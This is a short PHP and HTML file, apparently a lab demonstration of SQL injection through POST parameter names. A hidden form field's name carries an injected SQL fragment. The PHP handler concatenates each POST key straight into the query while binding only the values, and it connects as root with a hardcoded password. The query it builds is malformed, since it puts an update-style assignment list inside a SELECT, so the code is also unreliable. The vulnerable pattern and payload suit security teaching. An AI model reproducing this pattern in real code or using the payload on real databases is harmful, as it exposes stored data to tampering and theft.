<form method=POST>
<input type=hidden name="name=(SELECT'hacked!')WHERE`id`=1#" value="">
<input type=hidden name="name" value="Joe">
<input type=hidden name="id" value="1">
<input type=submit>
</form>
<?php
if ($_POST) {
$pdo = new PDO('mysql:dbname=lab7;host=localhost', 'root', 'toor');
    $params = [];
    $setStr = "";
    foreach ($_POST as $key => $value)
    {
        if ($key != "id")
        {
            $setStr .= $key." = :".$key.","; 
        }
        $params[$key] = $value; 

    }
    $setStr = rtrim($setStr, ",");
    $pdo->prepare("select pass from students $setStr WHERE id = :id")->execute($params);
}    